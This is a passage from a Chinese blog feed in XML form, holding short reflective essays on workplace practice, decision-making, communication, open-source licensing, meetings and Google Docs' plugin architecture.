        <content type="html"><![CDATA[<p>MIT 协议是一个宽松的协议，它允许使用者对内容做几乎所有的操作，不做限制，唯有一点，必须保留版权声明，什么叫做保留版权声明？就是把 MIT 协议的这个文件或者链接保留在你引用源内容的地方。对于文章类可以采用 CC-BY 协议。</p><p>有人说，我在网站上用了别人的开源产品，如何保留版权声明呢？有两种方式，一是在代码引入处保留协议，有些代码压缩工具能够识别协议内容的；另外一种可以如图所示参考 Chrome，在产品的关于页，清清楚楚地把所有用到的开源产品及其协议展示出来。<br><img src="/../blogimgs/2022/05/26/1653537420229-92cc47ed-243c-49e5-ab88-a8558ac971ed.png" alt="image"><br><img src="/../blogimgs/2022/05/26/1653537424041-f7f64924-2be1-4014-9398-3a1af487b44e.png" alt="image"></p><p>那些只行使权利不履行义务的使用者，拿自己不知道、不懂作为由头，欲撇开所有责任，不仅仅是不道德，其实已经触碰了法律的边界。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>既要、又要、还要</title>
      <link href="/blog/2022/05/25/ubc0dc/"/>
      <url>/blog/2022/05/25/ubc0dc/</url>
      
        <content type="html"><![CDATA[<p>对于一个决策者来说，他最大的权利就是可以选择要什么和不要什么，也就是取舍权。而不得不去做的，便是行使自己的取舍权。</p><p>不要以为什么都不做就是不决策，这也是一种决策——主动放弃自己的决策权，让渡给其他人。如果一个决策者连决策权都让渡了，久而久之，那他就不再是决策者了。</p><p>而天天喊着既要、又要、还要的人，也是在行使自己的决策权——做了一个什么都要的决策。这是因为决策者没有看清客户的需求，找不到重点，于是什么都成了重点。</p><p>当想要的太多的时候，必须停下来思考，哪一个是必须要的，没有它就活不下去，没有它就没有奔头，没有它就要付出巨大的成本，如果最后思考下来，一个都不是，那就得重新定义一个新的目标了。</p><p>聚焦才能把事情做的更好。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>难，是因为你觉得它难</title>
      <link href="/blog/2022/05/25/osocih/"/>
      <url>/blog/2022/05/25/osocih/</url>
      
        <content type="html"><![CDATA[<p>早上刷到一条视频，搜狐张朝阳说：“这个世界上没有困难的事情，难是因为你觉得它难”。</p><p>任何一件复杂的事情都可以被分解成多个步骤，而每个步骤完成起来，就像早上起床、刷牙、吃饭、打车一样简单和自然。之所以觉得进入一个新的领域很困难，是因为还不够熟悉它，没有经历过复杂任务的拆解过程，没有把那些还未执行过的简单任务执行一遍。</p><p>回想一下，自己的学习过程，也是这样的。刚开始是模仿，一步一步跟着有经验的人操作；等操作变得熟练了，接下来就是独立执行，去处理更多边界问题；然后才会考虑整个任务执行过程中的顺畅度、效率、质量以及价值问题；最后在整体理解的基础上，再对系统进行局部或者全局的优化。</p><p>认知里的困难比实际任务的困难更难，如果正在执行一件有挑战的事情，先克服内心的自我创造出来的困难。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非暴力沟通</title>
      <link href="/blog/2022/05/24/dmp6yz/"/>
      <url>/blog/2022/05/24/dmp6yz/</url>
      
        <content type="html"><![CDATA[<p>建立在不以自我为中心，尊重客观事实而非主观臆断的沟通才能称之为非暴力沟通。</p><p>“你这个想法不对”，想法的对错不建立在个人判断之上，你认为的不对，在其他人眼里可能是对的，改成“我的想法跟你不一样，我是这么考虑的…”，这就是非暴力。</p><p>“你听懂我说的话了么？”，这是以自我为中心，没有听懂有可能在多个环节出了问题，比如信息不对称，传达有错误或者表述不准确等等，可以先问，“我表达清楚了么？”</p><p>非暴力沟通建立在相互尊重的基础之上，换位思考，柔性表达。工作和生活之中的交流，更换一种表达方式就可以解决很多不必要的问题，何乐而不为呢？</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>看到闪光点</title>
      <link href="/blog/2022/05/24/hdw36q/"/>
      <url>/blog/2022/05/24/hdw36q/</url>
      
        <content type="html"><![CDATA[<p>很多人只知道阿里的绩效有 3.25&#x2F;3.5&#x2F;3.75 三档，但是不知道其实还有 4 和 5（系统里没有体现出来），工作七八年，有见过几个拿 4 的同事，基本都是因为作出了一些开创性的、杰出的贡献。</p><p>之前有看到讨论，说有些海外的同事上来就给自己打一个 5 分，他们脑子里想的是，设置了 5 分不就是给人打的么，为啥你们都给自己打一个 3.5 呢？想一想也蛮有道理的。觉得自己 5 分就打嘛，觉得自己价值观 A 也打嘛，有啥不好意思的，大不了就是被两级主管叫到一个小房间里，展开讨论和交流嘛。当然，得说清楚自己做的事情是不是符合预期。</p><p>在阿里，我交流过的同事里，似乎在价值观这一项，从来都是 B，即便他们的日常工作已经在部分项目中达到了 A，也不会在自己的绩效里打出来。这个时候主管的态度真的很重要，不仅要让同学认识到自己的不足，也很有必要让他们知道自己优秀在哪里。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>需要小聪明，也需要笨功夫</title>
      <link href="/blog/2022/05/23/yr7gk6/"/>
      <url>/blog/2022/05/23/yr7gk6/</url>
      
        <content type="html"><![CDATA[<p>小伙抱怨，二本毕业各种行业都干过，最后仍是厂里拧着螺丝钉月薪 5k 熬着日子，早知如此，还不如高中毕业直接参加工作，还能省却大学四年 15w 的开销。</p><p>九年义务教育的普及让整个社会的受教育程度越来越高，可以这么说，如今的二本跟父辈的高中水平是差不多的，而即便是重点大学毕业，也无法与当年的杂牌专科媲美，没有工作分配，更没有铁饭碗。</p><p>这是一个把价值和能力复利展现得淋漓尽致的时代。有的人在大学期间打游戏，混完四年；而有的人成天泡在图书馆，阅读专业领域书籍，增长见识。也是这么点点滴滴、日拱一卒的细小差异，让一个人在四年之后发生了质的改变，抛开其他运气成分不说，正是因为这一差异，后者在未来事业的起跑线上获得了先发优势，这是职场之路最开始的复利。同样的，工作中，又因为工作或者学习勤奋了那么一点，时间久了，便再一次获得了价值和能力的复利。</p><p>今天看到一句话，很有感触：<br>人总以为决定命运的选择是在一瞬间作出，其实那就像长途步行，转向不是在一瞬间直角弯九十度到来的，而是日常行差踏错中，每天走歪一厘米造成的。我们今日所在的位置，都是由过去日积月累的细小选择所致。<br>via <a href="https://twitter.com/435Hz/status/1528304492625596416">Twitter</a></p><p>理想的情况，借着复利，人生就像滚雪球一样，越滚越厚，越走越顺。社会的“卷”也源于此。有的人到大学才开始卷，而有的人从小学就已经开始了，更有甚者，当你还在襁褓之中时，你的父母就开始替你准备最好的教育资源，开拓最有效的长见识渠道了。</p><p>有趣的是，今天社会的主旋律是“反卷”，卷已经变成了一种可以被鄙视的行为。不过有一点是不需要担心的——那就是不断学习，巩固和提升自己。在风口上，猪也能起飞，可是当风口过去以后呢？需要看清楚，到底是借了环境的势，还是为了适应环境而获得了在各种恶劣环境下生存和作战的能力？或者，再想一想，脱离环境，自己还剩下些什么，那些足以为傲的荣光还是否存在呢？</p><p>有人说，选择比努力重要，但如果不努力，就连选择的机会都没有。工作中我见过不少愿意付出努力的人，他们的起点可能没那么高，基础没那么牢，方法也不一定有多好，但靠着两年、三年甚至五年的持续耕耘，凭着一股“傻劲”，愣是变成了一个领域的行家。</p><p>骨头啃不下来，大抵是输给了自己。</p><p>一位心理大师说过，心理变，态度亦变；心态变，行为亦变；行为变，习惯亦变；习惯变，人格亦变；人格变，命令亦变。你看，要让命运发生变化，需要经历多么漫长的转换，而往往我们在第一步——心理变——就倒下了，接受不了苦痛，接受不了无聊，接受不了寂寞。</p><p>上次刷哔哩哔哩视频，看到张三丰的第十五代传人传道，告诉新弟子们打拳如何做到下盘扎实，“无他，扎马步尔”。刚开始能扎个三五分钟，不得了了，但是慢慢地，要开始加量，体会肌肉的酸痛，牵引着思绪在身体内游走，过程中不断去微调身体的难受，从痛苦变成感受再到一种享受的状态，最后扎两三个小时都不是问题。</p><p>对我来说，有一种顿悟的感觉。平时太喜欢使用蛮力去抵抗困难，就像爬山一样，刚开始不顾一切地往前冲，没几分钟，气喘吁吁，呼吸跟不上，身体也吃不消。但也忘却了，还是需要去感知身体的痛苦，心里的痛苦，不抗拒，也不忽视。</p><p>扎马步的时候，手臂累了，就微微调整手臂的姿势；大腿累了，就微微调整步伐。没有人规定扎马步就是纹丝不动，我们的目的也不是为了保持纹丝不动，而是感受身体的波动，去适应和调整，最终达到可以承受更多的苦痛，突破极限。心理上的痛苦也是一样，师傅说，那些能克服身体苦痛的人，内心也会变得更加沉稳，因为他们学会了像调整身体酸痛一样，去调整内心的不平衡。</p><p>需要小聪明，也需要笨功夫。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做好自己</title>
      <link href="/blog/2022/05/22/zaghh5/"/>
      <url>/blog/2022/05/22/zaghh5/</url>
      
        <content type="html"><![CDATA[<p>打开手机，看到了好些低靡、悲观、消极的情绪<br>疫情，裁员，经济下行，形式不太好<br>在思考自己站在什么位置，受到了哪些影响<br>但似乎也还好</p><p>生活还在继续，做好自己，让存在多一些意义</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反刍是为了更好地消化</title>
      <link href="/blog/2022/05/16/yfbkwm/"/>
      <url>/blog/2022/05/16/yfbkwm/</url>
      
        <content type="html"><![CDATA[<p>热爱争论的人可以分为两类，一类是期望通过争论来完善自己的理论，另外一类是享受争论的过程。第二类人，不要和他争论，你争得面红耳赤，他却乐在其中。</p><p>表达固然重要，但更重要的是倾听。聊完之后，赶紧忘记自己说过的话，回到对方的语境之中，理解了对方的观点以后，再把自己讲过的东西捡回来。反刍的作用就是更充分地吸收营养。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决一个问题而引入另一个</title>
      <link href="/blog/2022/05/16/nq0sgf/"/>
      <url>/blog/2022/05/16/nq0sgf/</url>
      
        <content type="html"><![CDATA[<p>工作中最害怕的是为了解决一个问题，引入一些机制或者规则，而在这个机制或者规则之下，又会多出来新的问题。所以我们去评估一个解决方案的效果的时候，需要从三方面去看待：</p><ol><li>当前问题是否得到改善，改善程度如何</li><li>新的机制或者规则是否足够好，引入了哪些新的问题</li><li>存量的问题在新的规则下如何得到妥善处理</li></ol><p>打个比方，产品模块在某个业务规则下做改造，新增了必须达到某个环境条件才能够访问该模块的策略。那么这个时候就需要去评估，新的规则解决业务问题了么？这需要从数据的角度分析，而不仅仅停留在理论层面；然后去看是否带来了新问题，很显然，新的用户使用起来门槛很高，这让人很痛苦，新问题就需要用科学的方法去评估用户的痛苦程度，如果过高需要调低阈值；第三个问题是存量数据的问题，之前能访问该模块，而现在不能访问的用户如何处理呢？可能需要做数据订正，可能需要增加白名单，方案有很多。</p><p>你看，本来我们是要解决问题 A，但是却引入了问题 B 和问题 A’，两个问题的处理成本总和并不亚于原问题。我们不能为了简单而选择简单地处理问题，或许最合适的方式是，让用户知道，平台的边界在哪里，有些问题是平台会去解决的，有的问题是平台暂时不会去解决或者无法解决的，勾起用户的同理心，同时降低心理阈值。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KPI 是解药也是毒药</title>
      <link href="/blog/2022/05/15/glfy9e/"/>
      <url>/blog/2022/05/15/glfy9e/</url>
      
        <content type="html"><![CDATA[<p>KPI 需要量化，量化的数字越具体，行动点越明确，那么事情做起来目标感就会越强。这也带来了另外一个问题，大家会把思考都聚焦在这个数字上，去想其他东西的时间变得越来越少。想在 KPI 的文化下把创新做好，是比较有挑战的事情，主要依靠那些除了能够把 KPI 做好，还有余力去思考更多价值的人。</p><p>OKR 的作用在于凝聚共识，在上下对焦的过程中，想清楚如何为用户创造价值，不断明确 Objectives，确定思路，形成取舍。再回头看看 KPI，它并不直接关心用户价值这件事情，虽然完成 KPI 上的指标可以一定程度实现用户价值，但它强调的是组织「要什么」，而不是「要怎么做」，更不会回答为什么要这么做。</p><p>无论是 KPI 还是 OKR 都只是公司和团队管理的一种工具，既然是工具，就有可以改造和升级的地方。如果你看到有人把 OKR 用的像 KPI，或者把 KPI 用出了 OKR 的味道，也不用惊讶，没有人要求一定要按照书本上的方式玩这些工具。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让人参与到游戏中</title>
      <link href="/blog/2022/05/13/rmy6d6/"/>
      <url>/blog/2022/05/13/rmy6d6/</url>
      
        <content type="html"><![CDATA[<p>工作中最痛苦的事情莫过于单兵作战，所有的事情都自己一个人一肩抗，不仅艰辛，而且寂寞。</p><p>一件复杂的事情，要让人参与进来，首先需要对这件事情进行有机分解，不能太碎片化，也不能太大块，得把事情的边界捋清楚。这让我想起了微服务的拆分，需要保持单一职责、高内聚低耦合，同时服务又不能太细，并且拆分后的服务之间还能够相互关联，不是完全独立的。</p><p>事情拆分之后，接下来要考虑的就是目标和机制的确定，不要对人的期望太低，也不要对事的期望太高，把问题域控制在一个上下边界之中，给予一个期望值，让它按照预定的轨迹行走。</p><p>让事情有节奏地进行，不是拿着鞭子在后面抽打。一群羊站在悬崖边，只有领头羊先跳到对面，后面的羊才会跟着一起跳过去。榜样的力量是最好的行动催化剂。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何避免故障</title>
      <link href="/blog/2022/05/13/qek0er/"/>
      <url>/blog/2022/05/13/qek0er/</url>
      
        <content type="html"><![CDATA[<p>刚加入阿里的时候，总听人调侃，“没有经历过故障的人生是不完整的”。最近几年，我感觉把别人一辈子都遇不到的故障都经历了一次，从刚开始的谨小慎微，到现如今还算是胆大心细。</p><p>我在 15 年的时候就接手做淘宝 PC 端首页，当时流量最大的时候差不多有 1.5 亿；整个淘宝首页就我一个开发，对接大量三方接口、一堆业务运营，而且连一个测试人员都没有配，全靠自测；最可怕的是，架构组总是拿淘宝首页开刀，做一些尝新的东西，因为淘宝首页做了，那么其他业务开发就没理由不去做。在这个岗位上战战兢兢地干了一年半。</p><p>从那个时候开始，我就学会一件事情，叫做小心翼翼。搞得我后续 N 年的工作中都保持着“穷尽一切思考也要找到业务和技术边界 case 以避免故障”的习惯。这两年切换到后端和 SRE 视角以后，这种习惯更甚。</p><p>如何避免故障，其实很简单，保持思考周全、小心翼翼；要重视问题，并且能够及时消灭问题。一个小小的隐患，一旦流量被放大，那将会是一场不可收拾的灾难。</p><p>当然更重要的是从每一次故障中汲取经验，做到同样的问题不再犯，并且举一反三去解决更多的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开有效的会议</title>
      <link href="/blog/2022/05/12/bv9cuz/"/>
      <url>/blog/2022/05/12/bv9cuz/</url>
      
        <content type="html"><![CDATA[<p>公司开会永远有一堆可以吐槽的事情。</p><p>一屋子人，作陪的 60%，全场下来一句话没说过，也没好好听；那这种会为啥要把人拉过来呢。</p><p>还有更有趣的，议题都没有选好，先圈一波人，然后直接发会议邀请，我仿佛看到了一个小学还没毕业的孩子拉了几个大人过来玩过家家，会议可不是为了把议题和下次开会时间讨论出来。</p><p>还有动不动就把人拉进电话会议的，在会议过程中引入无数的讨论变量，把会议拖得无限冗长。</p><p>能不能把会开好直接体现出会议发起者的综合素养，如果我两次遇到某个人的会议都是低质低效，那基本上就给这个人打上了“不靠谱”的标签，以后在合作上也会尽可能避免找他，或者做出资源上的倾斜，尽量不理会这种人。</p><p>其实增加一个简单的规则也可以避免很多问题——不开没有文档的会议，会议提前一天或者至少提前两个小时发出文档，讲清楚要讨论问题的背景、议题、基本分析和初步结论，文档质量太低，不参加会议。很多时候，评审文档后就会发现，其实根本没有开会的必要性。</p><p>写文档很难？不难，懒得写而已。既然你都懒得写了，我为啥就不能懒得参会呢？</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>去看业务的全貌</title>
      <link href="/blog/2022/05/12/xa3pqb/"/>
      <url>/blog/2022/05/12/xa3pqb/</url>
      
        <content type="html"><![CDATA[<p>了解业务的全貌才有机会做更加准确的产品和技术决策，这也是为什么技术同学需要走进业务的原因。</p><p>业务的需求都是碎片化的产品定义，一味地承接这类业务需求，只会越做越厌倦，投入了大量精力，但是未必能够解决真正的业务问题，就更不用说去解决用户体验和客户价值问题了。</p><p>“全貌”这个词可能有点宏大，但是多听多看、想办法收集更多信息还是可以做到的，从历史代码中、业务周会上、产研交流里、用户之声等等，有很多途径可以分析出来手里做的事情正在解决什么问题，当前的解决办法是不是最好的办法。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加入新团队做什么</title>
      <link href="/blog/2022/05/12/kyah41/"/>
      <url>/blog/2022/05/12/kyah41/</url>
      
        <content type="html"><![CDATA[<p>新人加入团队后要做的几件事情：</p><ol><li>了解团队的技术架构和研发流程</li><li>根据 1 补齐自己的短板和不足</li><li>基于 1 和 2 切入一两个业务小问题，尝试修改</li><li>持续完善团队文档和沉淀的不足</li></ol><p>最重要的是 4，如果奔着 4 去做，那么 1、2 和 3 也是必经之路。 </p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>做问题的终结者</title>
      <link href="/blog/2022/05/12/dx7zue/"/>
      <url>/blog/2022/05/12/dx7zue/</url>
      
        <content type="html"><![CDATA[<p>反馈问题最无可奈何的就是从反馈者变成协查员的角色。</p><p>被拉到一个群，然后从两个人变成五个人，接着从五个人变成十个人，最后变成一个五十人的大群，而每进来一拨人，作为协查员就要提供更多的信息，有的时候还要把之前说过的话再说一遍。当然，五十人有点夸张，但是经常会到十多人的规模。</p><p>有一个理念挺不错的——问题到我即止。无论问题的链路有多长，如果想处理这个问题，那么最多打扰用户一次，收集所有需要的信息，然后根据系统的日志、各网关的日志去排查线索，追踪更多信息。如果涉及到更多链路的更多人，那就把自己变成这个反馈人，继续追查下去。</p><p>能有这种责任心的研发，怕是快要绝迹了，如果能够遇到这种人，请珍惜。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的碎语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>帮用户写好文档</title>
      <link href="/blog/2021/12/12/ly6l83/"/>
      <url>/blog/2021/12/12/ly6l83/</url>
      
        <content type="html"><![CDATA[<p>周末研究了一下 Google 文档的页面架构设计，不得不感叹在如何写好文档这件事情上 Google 下了大量的功夫。<br><img src="/../blogimgs/2021/12/12/1639298396707-cd534081-9db1-4f20-9622-eb827b719952.gif" alt="image"><br>架构设计主要分为两部分，第一部分是分页设计和排版引擎。为了更流畅的性能和多端更好的兼容性，谷歌选择使用 Canvas 来绘制整个页面，每一次输入都会发生一次 OP（<a href="https://en.wikipedia.org/wiki/Operational_transformation">Operational Transformation</a>）传输和画布重绘，从接口的交互状态来看，前后端的排版计算引擎应该是同构的。另外一部分是插件的实现，考虑到性能和安全问题，插件的运行跟主进程之间是完全隔离的，渲染引擎会给插件提供两块能力，一块是取数据，另外一块是插入数据，注意，修改文档的能力，比如删除和替换，是没有提供的，这样的设计也保障了整个文档的编辑历史一定是由人的操作来生成的，而不是程序或者插件，在做编辑历史记录和多人协同交互的时候，能避免很多不必要的麻烦。</p><p>插件获取数据的方式就是通过读取页面暴露的 <code>getSelection</code> API，不过它只能探测到用户当前选中的文本位置，比如 <code>[2038, 2044]</code>，表示从第 2038 个字符开始选中了 7 个字符，再附加一些辅助信息，也就是说插件是无法直接获取到用户文档内容的。获取不到数据，那如何对选中的内容做处理？从交互的流程上看，插件服务跑在 Google 的后端平台上，当前台插件发生交互，如将选中内容转换成 Markdown 格式的时候，会发起一个网络请求将位置信息和 token 授权信息传递给后端平台，由后端执行插件的逻辑，处理完成后再返回给前台，最后还需要在前台插件上执行插入操作，将内容插入到当前光标位置，或者执行复制操作，将内容放到剪贴板。</p><p>从插件的类型上看，大致可以分为三类，需要与文档深度数据耦合，比如划词评论、提出建议等，属于第一类，由编辑器自己实现，“划词评论”有非常多的富交互，不适合频繁与后端服务发生网络交互，而“提出建议”这个能力就做的更强大了，有点像 git 的 pull request 功能，允许评审人直接修改，作者来决定合并修改或是拒绝修改，这个交互过程中是有很多冲突需要处理的，考虑到性能和实现成本，在内核外延部分去实现这块逻辑会更方便；第二类是 Google 关联的业务，比如 Calendar、Note、Keep 等，它们也是独立运行在页面上的，不与文档发生直接关联，主要是共享数据以建立关系，比如发起一个会议、插入一条笔记等，数据可被文档消费；第三类是丰富多样的三方插件，比如生成二维码、格式转换、代码插入、绘图等，考虑到安全问题，基本上只能通过 getSelection 和 insertToDoc 这两个能力与页面发生交互，这类插件逻辑跟交互是分离的，数据的处理都在后端进行，处理完了之后插入到文档中。<br><img src="/../blogimgs/2021/12/12/1639298531001-e7ad424e-51d1-46e7-af47-2ed8474dbca1.png" alt="image"><br>除了排版和插件两块核心能力，另外一块比较重要的是协同部分，这就依赖协同服务对 Operational Transformation 的高效处理了，由于传输的数据格式过于复杂，就没有仔细研究了。</p><p>体验了几个小时下来，深刻感受到 Google Docs 在考虑帮助用户写好文档上下的功夫，这里的写好文档有两层含义，一是能够流畅无阻地进行编辑，即便文档再大、内容再多也可以保证交互过程不丢帧；另外一层是指能够帮助用户写出好的文档，利用一方、二方、三方插件，几乎可以做到不离开页面完成文档的撰写，比如翻译、文字纠错、文献索引、书记内容查询、绘图能力等等，如果还不够用，它甚至都提供了一个叫做「脚本编辑器」的能力，允许用户自定义脚本处理文本内容，不随意切换用户的工作上下文，是高效写作的充分条件。<br><img src="/../blogimgs/2021/12/12/1639298337101-08b1c2eb-65c5-471d-b5dc-ae104b936dd1.png" alt="image"><br>Google 将一篇文档视作一个容器，在这个容器编辑的过程中可以配置各种各种的插件、脚本、服务，配置了的资源都可以在页面的工具栏和插件栏中找到入口，不得不说这是非常极客的做法。但是，这样的做法也并非没有缺点，主运行环境和插件运行环境的隔离设计，在让内核保持清洁高效的同时，也让用户失去了很多所见即所得的能力，比如想翻译一下，首先需要安装插件，安装好了之后等待启动、初始化和装载数据，期间要等待至少一次网络 IO，如果在墙内操作，使用体验还是太糟糕的，非常慢。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>心中的沟壑</title>
      <link href="/blog/2021/11/29/kgka1q/"/>
      <url>/blog/2021/11/29/kgka1q/</url>
      
        <content type="html"><![CDATA[<p>小草沐浴着阳光，在和风细雨里，婀娜地摇摆着身躯，自由茁壮地成长。<br>无论是生活还是工作，在我们追逐梦想、达成使命的路上，如同小草这般，皆是我们心之所向。</p><p>然而，事情并不会时刻按照我们期望的样子向前进展，阳光晒多了它便是烈日，和风吹猛了就成了狂风，细雨飘多了那就是暴风雨……还有很多意想不到的事情如同 bug 般频频出现，土壤的肥料不足，小草营养不良；旁边冒出一颗大树，遮住了阳光；被人踩了一脚，一头栽进了泥土。或许长大以后就不会再担心这些问题，因为自身已经具备了足够的生存能力，但在长大之前，总是需要去解决这些疑难杂症。</p><p>工作和生活的时候往往会经历两种状态，一种是沉浸在完成一件事情的激情和平静之中，那是心流的感觉，找到了正确的路径，奔着远处朦胧的点，砥砺而行，愈往前愈发感到春光满面、活力四射；另外一种是迷失在繁多冗杂的事务之中，不停地切换上下文，一旦压得喘不过气，就开始陷入低迷状态的无限循环，最后被生活的一件小事，压到默默垂泪、声嘶力竭。</p><p>有的时候，会去思考，前面的路到底还有多少的未知数，数了数，一个、两个、三个、四个……还有好多。那种感觉，仿佛是命运之神故意在长跑路上布置的无数路障，她站在旁边，看着你，纵身跃起，跳过一个接着又是一个。力度不够，重重地摔倒在地上，磕得头破血流，她会等着你，等你收拾好心情，继续再去跳下一个。那种感觉并不好。</p><p>主观感受产生于内心的波动，快乐如此，痛苦亦是如此，如果对内心某种电光火石般的波动产生了执念，便会陷入到对它的无限“追求”之中；得不到则心有不甘，得到了也会害怕失去，追求是无止境的。回过头，再去想想，其实那些只不过是我们臆想出来的心中的沟壑。没有上帝，也没有命运之神，看着自己跌倒又爬起来的是自己，看着自己进入心流的也是自己。</p><p>学会适应波动，才能感受到内心的平静，虽有疼痛不会感到悲惨，虽有愉悦不会陷入波澜。</p><p>心情不好的时候就会感觉整个世界都在跟自己做对，而遇到的事情却跟平常经历的没什么区别。“本来无一物，何处染尘埃”，我们所看到的世界附加了个人主观感受，因此变得不同。附带了愤怒看到的就是愤怒的世界，附带了平静看到的便是平静的世界。禅宗提到“见性”，也就是显露心性，心性的显露是可以主观控制的，“菩提本无树，明镜亦非台”。</p><p>真正的快乐在于放下，在于适应它，感受此刻的痛苦而无需追求解脱，感受此刻的快乐而无需担忧失去。接受心中的那些沟壑，学会与他们和平相处。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>手头的事情做不完？</title>
      <link href="/blog/2021/09/23/vg3qgm/"/>
      <url>/blog/2021/09/23/vg3qgm/</url>
      
        <content type="html"><![CDATA[<p>我们每天都生活在忙碌之中，手里头总是有一堆做不完的事情，一件接着一件，时间久了，可能会觉得乏味，没有成就感。</p><p>从工作内容的产出方式大致可以分为两类，一类是别人指派或者自己构思出来的任务，另外一类则是遇到问题，阻塞了我们的日常，不得已放下手头工作去疏通。第一类工作的执行有助于帮助我们达成目标，但往往都是重要但不紧急的；而在一个不稳定的环境下，第二类工作的占比会更高，这类需求会耗散我们大量的精力。切换工作上下文的成本是巨大的，思绪从一件事情跳转到另外一件事情需要 2 到 10 分钟，甚至更长时间。</p><p>规划好时间可以一定程度解决问题，把安静的时间留给大块内容，嘈杂的时间留给琐碎内容。但解决问题的最好的办法不是规划时间，而是规划事情。把一件事情做完可能没有太多难度，但是把一件事情做漂亮就需要有一些技巧了。怎样才算是把一件事情做漂亮呢？</p><p>当我们收到一个任务时，可以先提出一些问题：这个问题需要我去解决吗？谁解决会更合适？这个问题是要现在解决吗？什么时候解决更合适？这个问题需要以当前的方式来解决吗？换个方式怎么样？可以多做一点去解决更大的问题吗？可以少做一点更聚焦么？当我们重新去思考这些问题的时候，事实上我们不仅仅是在解决问题，也是在重新定义问题，定义一个更漂亮的问题。</p><p>当然，并不是每一次都有机会把事情做漂亮，但这不妨碍我们每一次都去思考如何把这件事情做得更好一点。思维是慢慢培养出来的，大脑需要长期训练，训练越多，结构化思考的能力就会越强。</p><p>大多时候忙都是因为搞不清楚事情的边界，要么做的太多，投入产出比不高，要么做的太少，遗留了一大堆的问题，最后被人穷追猛打。时不时切换更多维度和视角来看待眼前的事情，可以蹦出更多的思路，如果实在是切不出新的视角，看书和找人沟通或许会有点帮助。</p>]]></content>
      
      
      <categories>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小胡子哥的思源地 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关闭手机通知以后</title>
      <link href="/blog/2021/09/18/im3xzy/"/>
      <url>/blog/2021/09/18/im3xzy/</url>
      
